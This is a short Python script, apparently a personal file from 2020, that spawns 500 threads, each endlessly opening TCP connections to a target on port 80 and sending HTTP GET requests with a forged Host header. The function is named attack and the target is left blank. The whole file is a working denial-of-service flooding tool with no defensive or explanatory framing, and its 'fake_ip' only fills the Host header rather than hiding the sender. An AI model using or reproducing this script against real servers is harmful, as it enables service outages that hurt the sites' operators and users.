# -*- coding: utf-8 -*-
"""
Created on Sat Jun 20 10:08:55 2020

@author: wwwds
"""


import socket
import threading
target=""
fake_ip="124.212.221.116"
port=80
def attack():
    while True:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target,port))
        s.sendto(("GET /" + target +" HTTP/1.1\r\n").encode('ascii'),(target,port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'),(target,port))
for i in range(500):
    thread=threading.Thread(target=attack)
    thread.start()